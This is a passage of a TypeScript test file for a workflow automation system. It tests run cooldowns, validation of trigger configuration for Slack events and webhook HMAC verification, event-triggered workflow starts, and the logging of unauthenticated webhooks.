    expect(runId).toBeDefined();
    const run = await getWorkflowRun(runId);
    expect(run).not.toBeNull();
    // Should complete (single notify node)
    expect(run!.status).toBe("completed");
  });
});

// ─── Cooldown ───────────────────────────────────────────────

describe("cooldown", () => {
  test("trigger within cooldown window produces skipped run", async () => {
    const workflow = await makeWorkflow({
      cooldown: { hours: 1 },
    });

    // First trigger — should complete normally
    const runId1 = await startWorkflowExecution(workflow, {}, registry);
    const run1 = await getWorkflowRun(runId1);
    expect(run1!.status).toBe("completed");

    // Second trigger — should be skipped (within 1-hour cooldown)
    const runId2 = await startWorkflowExecution(workflow, {}, registry);
    const run2 = await getWorkflowRun(runId2);
    expect(run2!.status).toBe("skipped");
    expect(run2!.error).toBe("cooldown");
  });

  test("no cooldown configured — always runs", async () => {
    const workflow = await makeWorkflow();

    const runId1 = await startWorkflowExecution(workflow, {}, registry);
    const run1 = await getWorkflowRun(runId1);
    expect(run1!.status).toBe("completed");

    const runId2 = await startWorkflowExecution(workflow, {}, registry);
    const run2 = await getWorkflowRun(runId2);
    expect(run2!.status).toBe("completed");
  });
});

// ─── TriggerConfigSchema validation ──────────────────────────

describe("TriggerConfigSchema", () => {
  test("accepts the wired Slack event and rejects unsupported event names", () => {
    expect(
      TriggerConfigSchema.safeParse({ type: "event", eventName: "slack.message" }).success,
    ).toBe(true);
    expect(TriggerConfigSchema.safeParse({ type: "event", eventName: "" }).success).toBe(false);
    expect(
      TriggerConfigSchema.safeParse({ type: "event", eventName: "github.issue.opened" }).success,
    ).toBe(false);
  });

  test("rejects verification configured without hmacSecret", () => {
    const result = TriggerConfigSchema.safeParse({
      type: "webhook",
      verification: { format: "token-equality", header: "X-Gitlab-Token" },
    });

    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues.some((issue) => issue.path.includes("hmacSecret"))).toBe(true);
    }
  });

  test("accepts verification configured with hmacSecret", () => {
    const result = TriggerConfigSchema.safeParse({
      type: "webhook",
      hmacSecret: "example-gitlab-token",
      verification: { format: "token-equality", header: "X-Gitlab-Token" },
    });

    expect(result.success).toBe(true);
  });

  test("accepts standard-webhooks verification and defaults its tolerance to 300s", () => {
    const result = TriggerConfigSchema.safeParse({
      type: "webhook",
      hmacSecret: "secret.STANDARD_WEBHOOK_SECRET",
      verification: { format: "standard-webhooks" },
    });

    expect(result.success).toBe(true);
    if (result.success && result.data.type === "webhook") {
      expect(result.data.verification).toEqual({
        format: "standard-webhooks",
        toleranceSeconds: 300,
      });
    }
  });

  test("rejects standard-webhooks verification without hmacSecret", () => {
    const result = TriggerConfigSchema.safeParse({
      type: "webhook",
      verification: { format: "standard-webhooks" },
    });

    expect(result.success).toBe(false);
  });

  test("accepts a webhook trigger with neither hmacSecret nor verification (intentionally unauthenticated)", () => {
    const result = TriggerConfigSchema.safeParse({ type: "webhook" });

    expect(result.success).toBe(true);
  });
});

describe("handleEventTrigger", () => {
  test("starts only enabled workflows subscribed to the Slack event", async () => {
    const matching = await makeWorkflow({
      triggers: [{ type: "event", eventName: "slack.message" }],
    });
    const disabled = await makeWorkflow({
      triggers: [{ type: "event", eventName: "slack.message" }],
    });
    await updateWorkflow(disabled.id, { enabled: false });

    const payload = { channel: "C123", text: "service is down", ts: "123.456" };
    const runIds = await handleEventTrigger("slack.message", payload, registry);

    expect(runIds).toHaveLength(1);
    const run = await getWorkflowRun(runIds[0]!);
    expect(run?.workflowId).toBe(matching.id);
    expect(run?.triggerData).toEqual(payload);
  });
});

// ─── Boot-time open-webhook inventory ────────────────────────

describe("logOpenWebhookTriggers", () => {
  test("never throws, even with a mix of open/signed/disabled workflows", async () => {
    await makeWorkflow({ triggers: [{ type: "webhook" }] });
    await makeWorkflow({ triggers: [{ type: "webhook", hmacSecret: "s" }] });
    const disabled = await makeWorkflow({ triggers: [{ type: "webhook" }] });
    await updateWorkflow(disabled.id, { enabled: false });

    await expect(logOpenWebhookTriggers()).resolves.toBeUndefined();
  });
});
